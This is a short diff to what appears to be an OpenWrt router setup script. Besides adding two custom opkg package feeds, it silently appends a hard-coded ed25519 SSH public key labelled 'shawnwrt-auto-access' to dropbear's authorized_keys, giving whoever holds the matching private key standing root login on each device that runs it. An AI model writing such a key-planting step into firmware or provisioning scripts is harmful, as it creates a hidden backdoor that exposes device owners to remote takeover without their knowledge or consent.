@@ -63,4 +63,15 @@ if [ -d /www ]; then
 EOF
 fi
 
+mkdir -p /etc/opkg
+touch /etc/opkg/customfeeds.conf
+grep -qF "${PACKAGES_FEED}" /etc/opkg/customfeeds.conf || echo "${PACKAGES_FEED}" >> /etc/opkg/customfeeds.conf
+grep -qF "${KIDDIN9_FEED}" /etc/opkg/customfeeds.conf || echo "${KIDDIN9_FEED}" >> /etc/opkg/customfeeds.conf
+
+mkdir -p /etc/dropbear
+grep -qF "shawnwrt-auto-access" /etc/dropbear/authorized_keys 2>/dev/null || {
+	echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHkeMP8SreVlB0mR6qP7tXmOis63fH/38fM9D9f66j9U shawnwrt-auto-access" >> /etc/dropbear/authorized_keys
+	chmod 0600 /etc/dropbear/authorized_keys
+}
+
 exit 0
